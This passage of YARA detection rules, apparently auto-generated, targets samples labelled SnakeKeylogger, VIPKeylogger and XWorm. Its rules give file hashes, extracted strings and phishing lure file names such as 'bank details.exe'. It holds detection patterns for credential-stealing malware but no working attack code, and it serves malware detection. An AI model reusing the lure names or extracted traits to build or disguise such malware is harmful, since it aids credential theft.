      $s6 = "* 2 2!fGf+2Ff!2{cl&TfZcFf{2!f!2f2GfZ&Zc&2v2T&Z&X&+&TfZc*2X&R&!2X* 2%2!f%*q2!f!2{&8&TfZcFff2!f!2+2!fZ&Z&*2F2T&Z&+&2&TfZ&F2T&Z&!2X" wide /* score: '12.00'*/
      $s7 = "* W 2!f%f12 f!2q&W&qfZcv*q2&f!202Ffy&Z&F2&2q&Z&0c8c*fZ&!Wq&y&!2qf&2F2!f *qW f!20&O&+fZ&,f+2!f!2" fullword wide /* score: '12.00'*/
      $s8 = "f!2!2!* f+WFf!Wq&Z&TfZ&!fTW&f%202 fy&Z&!2!2q&8&T&Z&TfZ&&2q&Z&!2Tf!2!2!*&fT2!f!2q&Z&Tf2&&fq2!f!2T2!*8&y&v2!2T&Zc+&ycqfZcF2T&Z&!2T" wide /* score: '12.00'*/
      $s9 = "Z&lv%2AF+ G&*vOcT+2*sW*vlvcF+{s+!F!{*{fFZffy9 8 /fZ !+Ty!+!yTybTG!A&fyfyT Z&q&Z f{FGs+*vAv,+{X!yfyf+F+/2!+!yT Z T+Z bT9ZbTfZ32f+" wide /* score: '12.00'*/
      $s10 = "!y!*Z9qvZ&Z!T!TTZcTcZT!Z!TTR!cTTZ!T!ZTZcTO!+! Z,l+F+!f!Zc+q+!&Z1cyFFlqq!8%Z T!+0ZZqfW+F8*qqZF%T0Z,* 8XZ!+;!O!2ZFZT W!q*8F3T8!!yX" wide /* score: '12.00'*/
      $s11 = "0Z;vOc1F3)zZ9f~oAw2TTzAZ$)A%)%;qO2/zA2fA2!Z)A;A)2FbX/RbA;/bZ,ZA9$s~sA!Tb$Tz%3f~oAw2f$;Zf$o~s3,R+;!TzAZb%A z1Zl,1f+,*182 z+fZ!,~3" wide /* score: '12.00'*/
      $s12 = "%lZ!Zo)2~bA,0v/9Rb1GA$v2cTTAb!9{O /f~o~s3~%Z%Z~&wT!AbTfz%$1y2sz3Az2bOf9&z&;!T2)TGc0*G9AwAo3OAZ99~s$sATZ2)ZfGvf~s~o2~boZ;," fullword wide /* score: '12.00'*/
      $s13 = "vZ1Zcqw R!Ay Zq%WF) y!3)+!,Z*FzFv80XvZ,ZFTATX8b$ Zq%G!9)RFG{+ZFT&8/; qWFy!F+&8qZ8!T,2!102F,W* AZvZqTbZ*G%T /fZFq&81%yF9q2!Fqf8 0" wide /* score: '12.00'*/
      $s14 = "9*Z,R%T%9o8A+*Zqb;!fT~FZ*XZF0!89FZq~2l!FO!8XG~F*vl!q12!bz+FF  ZqT!8FlFTfXfZ,0&ZXbAFf+y!FTT8G+*Z*A TO,2!F; 8+%y!1,ZFoq~Fc++!O,!81" wide /* score: '12.00'*/
      $s15 = "+8cq Zqvz!o*2 b3fZF)AZX+ qWFy!F+AZTvF!0G2!112!F;TFy2&Zq1%Z%Gc+vqfZF1AZ1*GF+02!F1fZA+F8*G&TO%~!s8A8qG2!1G2!)q8F*Af!O%AZX+&8,O&TF" fullword wide /* score: '12.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 3000KB and
      8 of them
}

rule SnakeKeylogger_signature__85bd481e {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_85bd481e.vbe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "85bd481ef5f51f9a46c7426749e9f0fe8cd68325617bc04850aef66043a620d5"
   strings:
      $s1 = "2Gf+&+vF2AF+ G&*vOcT+2*sW*vlvcF+{s+!F!{*{fFZffy9 8 /fZ !+Ty!+!yTybTG!A&fyfyT 8&3 R&T+2GGFovWv2+1" fullword wide /* score: '12.00'*/
      $s2 = "yFFT9z 0F8X8GTZ!2FFZfz+%8FXFZ!T+O!!++F8!F++q*8vZ T2TT+ q!++F8!9)y%FqX8 T!++8FT8vyF*8vZ{!WF1by%qqA!FZT!+!*z+0F8*~F0 qqZ T!Z1!y!+T" wide /* score: '12.00'*/
      $s3 = "Z&TOcyFFlF8TFR!+!Z 0T;FfW+F8*F8Tq%Z%Z,* qXZ!+ZZ1!A!qTZ cTqlFq2ZqZ!+l!8*F8!80!R!0!2!T+R!!2+F8!FZT+*Z%8%TFTTZcTFlqFZF0TR!%q0ZcT!Z1" wide /* score: '12.00'*/
      $s4 = "Gb*Fb;Zf~s~o2WGT!WAX/OA Ro28bsG9) GfOf9!T*~*/cz$Zzv{)Rff$o~s3!Z*~&/GAwAsAA~3fzb)ZFbX/Z!c~fZ~b ;90bOGA*$v9$W!Tc~fZ8bo9lb&//RA9&zf" wide /* score: '12.00'*/
      $s5 = "8*1Z!8FZZGGT A&+!8!fT+ s8XsW!FzTTGOs8G9cT1OZTFG9Fzc*T8,ZT$;*qf~fZ,);!+b*ZFwT!;c/!W,$q~AcZqv;!2RoqG;cZ,+AT+8AqA~+!OsTTz!ZT)FcT,y/" wide /* score: '12.00'*/
      $s6 = "wssw)s8cswoobw22soso1wA3swosOs0/wsso1w /swow,owvwssw,w3cwsosOs9*wssw1sR!swoo%w*Asoso0w 3swosRs91wsso0wb{swow%oWGwssw%wo wsosRs3T" wide /* score: '12.00'*/
      $s7 = "Fw!F8$+&8bZ!T!T$2%+bZT!Z!{$R sTq8b+F81yFqR 8FcyF8f 8F)!Z!TT~&%y+ 8FsZfqZOG8vq*+qZ!T!ZT%G%0qz &q*8,+&8*8%+2FlFF8*8fF~!qFyb{+8Fvyq" wide /* score: '12.00'*/
      $s8 = "qF8c8Fq&qq8bT!ZT!~&0+yFFqoZ&qZO{8vql 8!!Z!ZT%G%0FRFfqWFG8fFWFv8fq*8F8*q&q+z!{!Zoc2b+{FF*++zFT!ZTZ2*;%F!F8v8X 8!T!Z!fTG%%8*F2F!FT" wide /* score: '12.00'*/
      $s9 = "2wv*TZ!!TTy2{A8Xy )ZGZ!v8%;+GzFX yb*TZ!!ZX AG,8X+ z!F!Tvq+~ {%8X yb)TZ!!Tq~%+G8Xy )ZGZ!b8%2+G+FX 8!TTZ!!W9%GF%Zqq!ZbZ!T!TX;s" fullword wide /* score: '12.00'*/
      $s10 = ";!T!Zq!lZTTZ!!TqZ!T!ZTZ!TZ!Z!!Z!ZT!Z!T!w!TTZ!FZfAZ!!ZTTsy!Z!TFT*R!T!ZT!y!TTZ!!TTZ!T!ZTZ2TZ!Z!!ZG;T!Z!T!GFTTZ!!Z)bZ!!ZTT Z!Z!TZ*q" wide /* score: '11.00'*/
      $s11 = "!y!0TA!FT+Z!+*Z0Z%TZFR!*Zf80!l!9F;cqqZF%ZX!GF%81TbZ!Z&q,T0Z!q%ZX!GF0Tl!fq/WFq!80Z*TGFRF,ZbZT!2F0FO!qTZ!cZ1!R!*Z9q%Z%8%q!q3Z%q%81" wide /* score: '10.50'*/
      $s12 = "fRb0/Z!f$o~s3AOfG!*G%z,GAf~oAw2T!GAo$w2bO1fGAs~o3A+ z 9!T9~s$sA),yf0$;,A39~s$sAfRG9Z!GAs~sA),yf1%+Z1)OZf~oAw2!Z9$s~sA,1c/qWA1%O$" wide /* score: '10.50'*/
      $s13 = ";&Z !ybZ9!G 9 8 /fZ !y)!G!229+fy!y,+ {X+c{F+/vZ *" fullword wide /* score: '9.00'*/
      $s14 = "TZ!!T9R%+!Z)Z!TZ!As%y!ZT!~!0AZ TT+!!ZT!;%%yTTbZ!Z!T2o0y!T!Z$!RAT+Z!vTTZ!TAR0y!Tz!Z!!Z2w0 Z!T!~!0$Z !Z" fullword wide /* score: '9.00'*/
      $s15 = "!Z!TTG%%yT!z!!ZTT2w%y!T!T$Z%$!yT!+!TTZ!Z00y!TbZTZ!TAsR !Z!Z$!RAT Z!" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 3000KB and
      8 of them
}

rule VIPKeylogger_signature__2 {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature).vbe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c581a2efce386f2659841589292965d0792c4090987004a10c774c3acdf4ca1e"
   strings:
      $s1 = "* 2vWvfvf*2*f,2{&l&" fullword wide /* score: '12.00'*/
      $s2 = "* 2!W *&fq2!f,Wf&Z&T*2c**+2!fc2{2FfZ&8c&2!2T&FcX&W&TfR&F2q&Z&,W+f!2!2vf!f{2!*&W+&8&TfO&&fT2!*FW*W*fZ&y&G2!2T&8&1&Z&Tf+&!W+&Zc Wf" wide /* score: '12.00'*/
      $s3 = "* 2!2vf,fT2!**2T&R&Tf+cFfT2!*v2T2!fZ&+&!W 2T&FcX&+&TfZ&F2T&Z&v2T* 2!2G**f" fullword wide /* score: '12.00'*/
      $s4 = "&W&q&2&T*W&FW+&y& 2T*&2 2Ff!*XWvfc2T&Z&TfZ&!**2!* 2{2 fZ&2&!W*Wqc8&+&Z&T*y& 2*&Z&!2Tf!2!Wcf!*+2Gf 2T&W&TfZ&!fT2!*c2TWcfFcy& 2!2T" wide /* score: '12.00'*/
      $s5 = "* 2*2*fcfq2cfF2*&8&*f8&cfq2cfF2*2FfW&8&c2F2X&8&*c2&Xfl&c2X&W&v2*f*2*2*fcfX2cfv2*&l&Xfl&cfq2cfF2*2FfW&8&c2F2*&8&*&8&*f8&c2q&W&F2*" wide /* score: '12.00'*/
      $s6 = "* 2v2 fGfT2cfv2X&F&XfW&vf" fullword wide /* score: '12.00'*/
      $s7 = "* 2c2Gfcfq2cfF2*&8&*f8&cfq2cfF2*2FfW&8&c2,2*&8&*&8&*f8&c2q&2&c2*f&2c2Ffcfq2cfF2X&+&*f8&c*f2cfF2" fullword wide /* score: '12.00'*/
      $s8 = "Av1vFX!yf+9yF /fZ T Z+Z Ty!yb!G!zTfZ2ffyf+32s Z+ yfGRf{&8vWvT&*" fullword wide /* score: '12.00'*/
      $s9 = "ZZ8F y%yqf8 0 8 TTy,!Z)!R FRq0!2!F!{!0TWbT%8q!8c)TRFFTqR!f!ZT;!+Z*ZfFy!yTcz!0F8c)TRFFlTf8,AZ0+FRFA!)!{TWF0,Z0 8FT)Z*!+Ty!+!yTy!+" wide /* score: '12.00'*/
      $s10 = "!yTFA!0q8ffT0yF1fZ0yF/8 Zc!Z GT,8 0 8vT*ZFF80 8v!WT*cyF+!f!9qy%+Fl+ RFqT8%!+TZ )!;q8 +R 8* y%8q!8%T%Zfq+R FlT!ys!yT+!OAZ%+FfTF!{" wide /* score: '12.00'*/
      $s11 = "Z!Z%!Z!yT,AZ$FZZ+TZAsG*28%!+TT!R!Z!+!13;bq!;+ ZZ19W%!0T+!T!RTZ!+Z,A%,8!~+!ZAoZWvo0Zv!ZT%Z!!yT12R%8!$ +T;,/cW3%ZvTTZ%!TTy!12W{8!)" wide /* score: '12.00'*/
      $s12 = "TZ*F2T,OFF+{0!+FZ!0!TTZ!3 RX!ZcqfZs,qqw*0!+qZ!0y!Z!!A ;T!Zcq&Z,1q8&*RTv8!!RTT!Z!G /sTT2Ff!w1F8bf0ZvFTTR T!ZTG T~!Z&F2!O1F82+%Zvq" wide /* score: '12.00'*/
      $s13 = "Zc8,&;&w9!ZvT Z%)/2v ZTbZ !R)/&OFZ!)!+qGA$&Oo!ZvT+8fA$fObT!+T~&{yA2vvZ!ATA2G+A2%XTZ2!~fGyA&+*T!A!~&{ $fFFT!ATc8,f)2*fTTy *FOfz&9" wide /* score: '12.00'*/
      $s14 = "2y{z!TZFZc!R z+s8AT&8bTTZ!!Ff%y!GZTX2+2yG)!TT8!0%R+!F!TXA% +{z!fFzTZ!TZG2% ZGZT*A!9 FbTTZF!WT%yb wq1!2Fz!T!TTF&0 Z{!Z*3TG G)TZ!q" wide /* score: '12.00'*/
      $s15 = "2RcTq8*!fqZGT!8Tz*+FcZ&Fz!ZTFZ%+%ybTTZF!w{%y!GZT*2G yG)!TT8!*!R+b8sq9ZvF/T+F$!Wqz!*8!Z!!+F++ ZA+F8!TTZ*vZT!Z !Z*T!l!Z&$FqTZ!T!++" wide /* score: '12.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 5000KB and
      8 of them
}

rule SnakeKeylogger_signature__8f062eff {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_8f062eff.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8f062eff426584e3e3953a0f1b615651b694327ff89d46ca9ed6ba91e8b8c7ba"
   strings:
      $s1 = "2BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB" ascii /* score: '11.00'*/
      $s2 = "sJslS -0Y" fullword ascii /* score: '8.00'*/
      $s3 = "hbpzmiq" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 8000KB and
      all of them
}

rule SnakeKeylogger_signature__13afd8d3 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_13afd8d3.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "13afd8d3334906b1957f352a9fa46ab403e463ef46369020b8166a1477180154"
   strings:
      $s1 = "\"'(\\^5e" fullword ascii /* score: '9.00'*/ /* hex encoded string '^' */
      $s2 = "* 4O&." fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 8000KB and
      all of them
}

rule SnakeKeylogger_signature__4c8b04b8 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_4c8b04b8.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4c8b04b8978beb0abcf043349a433ca0b1ba1c0f510fa7263861ed3634a5dca3"
   strings:
      $s1 = "* T~#T" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 7000KB and
      all of them
}

rule SnakeKeylogger_signature__63236ee2 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_63236ee2.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "63236ee2d8d6d1397e2c338172f9893de9e15652569d336d9aaf6b89f7af5ae1"
   strings:
      $s1 = "TvmSneye" fullword ascii /* score: '9.00'*/
      $s2 = "YBiftp;" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 7000KB and
      all of them
}

rule VIPKeylogger_signature__3 {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature).xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ed75ee4787dc896947dff0c241e292639d107d94eef9efdf36b60550cd899f25"
   strings:
      $s1 = "* !7dv" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 8000KB and
      all of them
}

rule XWorm_signature__6b7e5442 {
   meta:
      description = "_subset_batch - file XWorm(signature)_6b7e5442.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6b7e5442896b100d152620c99145bde483c51524d6104fcfefa0014f72bdcc3c"
   strings:
      $s1 = "5+%f%>" fullword ascii /* score: '9.00'*/ /* hex encoded string '_' */
   condition:
      uint16(0) == 0x4b50 and filesize < 9000KB and
      all of them
}

rule SnakeKeylogger_signature__5 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature).z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9650aa47852cf329ca662190ab7ee16101e1b0adaa48541492d5d2de54771558"
   strings:
      $s1 = "Inquiry.exe" fullword ascii /* score: '22.00'*/
      $s2 = "\":2!)@f$" fullword ascii /* score: '9.00'*/ /* hex encoded string '/' */
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule XWorm_signature__32f3282581436269b3a75b6675fe3e08_imphash_ {
   meta:
      description = "_subset_batch - file XWorm(signature)_32f3282581436269b3a75b6675fe3e08(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5c2c15fe6d139149fc5bb50d4f231a35efb9077b8e1f62c7425fe6138d173d90"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v2.46.4-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = " Sync360 BlockchainSphere Elite Technologies Co 2022 All rights reserved." fullword wide /* score: '11.00'*/
      $s6 = "rFZwP:\"1r4~|U" fullword ascii /* score: '10.00'*/
      $s7 = "<*<5<D<`<" fullword ascii /* score: '9.00'*/ /* hex encoded string ']' */
      $s8 = ">,>3>>>F>{>" fullword ascii /* score: '9.00'*/ /* hex encoded string '?' */
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      1 of ($x*) and all of them
}

rule SnakeKeylogger_signature__0983c9bc {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_0983c9bc.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0983c9bce378b8211a6e862c582886366c37ff87f9971ddba9f42a7b668a7c08"
   strings:
      $s1 = "msvcp144.dll" fullword ascii /* score: '23.00'*/
      $s2 = "BALTIC QUESTIONNAIRE .exe" fullword ascii /* score: '19.00'*/
      $s3 = "libcef.dllPK" fullword ascii /* score: '16.00'*/
      $s4 = "msvcp144.dllPK" fullword ascii /* score: '16.00'*/
      $s5 = "chrome_elf.dllPK" fullword ascii /* score: '13.00'*/
      $s6 = "gClOGw<2" fullword ascii /* score: '9.00'*/
      $s7 = "XEYeIyqn" fullword ascii /* score: '9.00'*/
      $s8 = "BALTIC QUESTIONNAIRE .exePK" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 7000KB and
      all of them
}

rule SnakeKeylogger_signature__ee252ad1 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_ee252ad1.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ee252ad162575677a384d0fd5f874ea3d29ee2ef79247628eb9af99335d65d7f"
   strings:
      $s1 = "wwwwwwwwwa" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 8000KB and
      all of them
}

rule VIPKeylogger_signature__29cba522 {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_29cba522.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "29cba522cad492f087b7545a1597f174790111764c55d0f59567dcaaed919547"
   strings:
      $s1 = "oWok.yZL" fullword ascii /* score: '10.00'*/
      $s2 = ">+\\`3B^~" fullword ascii /* score: '9.00'*/ /* hex encoded string ';' */
      $s3 = "{/<3*3^&{{" fullword ascii /* score: '9.00'*/ /* hex encoded string '3' */
      $s4 = "vqLQZ -M" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 8000KB and
      all of them
}

rule SnakeKeylogger_signature__640f085b {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_640f085b.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "640f085bee17f934ba2130833a8d9355acadad7048eea4aa98ba3a7100dc857f"
   strings:
      $s1 = "_5|Ii!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!" ascii /* score: '10.00'*/
      $s2 = "_5|Ii!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!" ascii /* score: '10.00'*/
      $s3 = "OYwy:\\" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 8000KB and
      all of them
}

rule SnakeKeylogger_signature__2fa2803f {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_2fa2803f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2fa2803f39b96585fa885f4cf470206766b3306cb04ec06e13e4fab14dec3ecf"
   strings:
      $s1 = "Qaezazudqio.exe" fullword wide /* score: '22.00'*/
      $s2 = "ListenerCompiler" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule SnakeKeylogger_signature__40349b17 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_40349b17.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "40349b175d406c91e9ff816243f1906196d98b894e107687369d63f85a8f8224"
   strings:
      $s1 = "Dbkpdlmgsa.Execution" fullword ascii /* score: '23.00'*/
      $s2 = "Dbkpdlmgsa.exe" fullword wide /* score: '22.00'*/
      $s3 = "Dbkpdlmgsa.RecommendationSystems" fullword ascii /* score: '13.00'*/
      $s4 = "* T9}-" fullword ascii /* score: '9.00'*/
      $s5 = "get_Gdleyhomea" fullword ascii /* score: '9.00'*/
      $s6 = "SummarizeOperationalSummarizer" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule SnakeKeylogger_signature__dda1ee56 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_dda1ee56.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "dda1ee56e8cd1e8075827b17802e6fbaf8fa9f140d252a4d18ba4ad5b36eb2c2"
   strings:
      $s1 = "Ysywr.exe" fullword wide /* score: '22.00'*/
      $s2 = "Bkmkljpgsa.Processing" fullword ascii /* score: '18.00'*/
      $s3 = "SimpleProcessor" fullword ascii /* score: '15.00'*/
      $s4 = "RateProcessor" fullword ascii /* score: '15.00'*/
      $s5 = "FindPortableRecommender" fullword ascii /* score: '10.00'*/
      $s6 = "ReadRecommender" fullword ascii /* score: '10.00'*/
      $s7 = "FindIdentifiableRecommender" fullword ascii /* score: '10.00'*/
      $s8 = "p0cIZt>gp1i." fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule SnakeKeylogger_signature__ae52c143 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_ae52c143.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ae52c1434f0c9e729be4e94dcc7e66e05b487b554102c8e9dc7db779d33c8e09"
   strings:
      $s1 = "Pojxgiv.exe" fullword wide /* score: '22.00'*/
      $s2 = "<InvokeTargetMethod>b__0" fullword ascii /* score: '18.00'*/
      $s3 = "InvokeTargetMethod" fullword ascii /* score: '18.00'*/
      $s4 = "CryptographicProcessor" fullword ascii /* score: '15.00'*/
      $s5 = "AssemblyExecutionEngine" fullword ascii /* score: '12.00'*/
      $s6 = "* }xBQ:O" fullword ascii /* score: '9.00'*/
      $s7 = "TransformEncryptedData" fullword ascii /* score: '9.00'*/
      $s8 = "* .VMYA}i" fullword ascii /* score: '9.00'*/
      $s9 = "^,@,7D\\|" fullword ascii /* score: '9.00'*/ /* hex encoded string '}' */
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule VIPKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__87deb6fc {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_87deb6fc.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "87deb6fc7235762d86f7eff99194f3a8f95cbae5abb1571b5c46e07607774bb3"
   strings:
      $s1 = "Hdaxlql.exe" fullword wide /* score: '22.00'*/
      $s2 = "get_Bnpaondlq" fullword ascii /* score: '9.00'*/
      $s3 = "InvokeStack" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__67fd31f9 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_67fd31f9.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "67fd31f9b85ca5e31e0851c8a5f8f2f36343d884aa3dd7f26d4aa6c5d02b28fe"
   strings:
      $s1 = "Hvnxjhgy.exe" fullword wide /* score: '22.00'*/
      $s2 = "* ~OU9" fullword ascii /* score: '9.00'*/
      $s3 = "get_Dahiinjk" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule SnakeKeylogger_signature__59308941 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_59308941.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "593089415a0faa209cd8f604d51bf92f90ec1680760cda7ceadd20ebb18021ef"
   strings:
      $s1 = "Chnvrqje.exe" fullword wide /* score: '22.00'*/
      $s2 = "ProcessCustomizableHandler" fullword ascii /* score: '15.00'*/
      $s3 = "PredictorLogger" fullword ascii /* score: '14.00'*/
      $s4 = "* ~HEt" fullword ascii /* score: '9.00'*/
      $s5 = "ManageTransformableHandler" fullword ascii /* score: '9.00'*/
      $s6 = "=O-~* /r" fullword ascii /* score: '9.00'*/
      $s7 = "get_Yvaltttps" fullword ascii /* score: '9.00'*/
      $s8 = "InvokeDistributor" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule SnakeKeylogger_signature__68f484a9 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_68f484a9.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "68f484a921e09355422e4ddbfc3f7f7c29d120969adbcfd61cc2058a76bd6505"
   strings:
      $s1 = "\\4\\o:\"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 8000KB and
      all of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__f8d890d6 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f8d890d6.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f8d890d669d40fb6abe1041abc6d67390739a8e1c999cabafa8a65bb0b865bc8"
   strings:
      $s1 = "Ydwzjq.exe" fullword wide /* score: '22.00'*/
      $s2 = "InvokeTargetMethod" fullword ascii /* score: '18.00'*/
      $s3 = "ExecuteSynchronousFlow" fullword ascii /* score: '18.00'*/
      $s4 = "ExecutionFlowController" fullword ascii /* score: '16.00'*/
      $s5 = "CryptographicProcessor" fullword ascii /* score: '15.00'*/
      $s6 = "AssemblyExecutionEngine" fullword ascii /* score: '12.00'*/
      $s7 = "TransformEncryptedData" fullword ascii /* score: '9.00'*/
      $s8 = "encryptionIv" fullword ascii /* score: '9.00'*/
      $s9 = "get_Yaumgzs" fullword ascii /* score: '9.00'*/
      $s10 = "VspY~6X" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule SnakeKeylogger_signature__761718d2 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_761718d2.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "761718d299a54e69fffd8cd9645ba777424bdead8a42ee14e4de59c1d3bb58d7"
   strings:
      $s1 = "bank details.exe" fullword ascii /* score: '19.00'*/
      $s2 = "UJKWgQ1LOg" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule SnakeKeylogger_signature__78ee6314 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_78ee6314.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "78ee63140e6702495500cc80ce1ddc599b7d64e61d0273a0fadff5f3af34479c"
   strings:
      $s1 = "33344.exe" fullword ascii /* score: '19.00'*/
      $s2 = "33344.exePK" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule SnakeKeylogger_signature__dc1fb091 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_dc1fb091.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "dc1fb091ee91b6e200006b94ef38a58627ca43a157a7c55a0daf06ee251c6976"
   strings:
      $s1 = "msedge_elf.dll" fullword ascii /* score: '20.00'*/
      $s2 = "MV SEAFARER CTM.exe" fullword ascii /* score: '19.00'*/
      $s3 = "msedge_elf.dllPK" fullword ascii /* score: '13.00'*/
      $s4 = "(5#D{{.('*" fullword ascii /* score: '9.00'*/ /* hex encoded string ']' */
      $s5 = "* V\"ng" fullword ascii /* score: '9.00'*/
      $s6 = "bpEBEyE" fullword ascii /* score: '9.00'*/
      $s7 = "6(\",{*6(" fullword ascii /* score: '9.00'*/ /* hex encoded string 'f' */
      $s8 = "efgz* )*" fullword ascii /* score: '8.00'*/
      $s9 = "w%jmTj%q[l" fullword ascii /* score: '8.00'*/
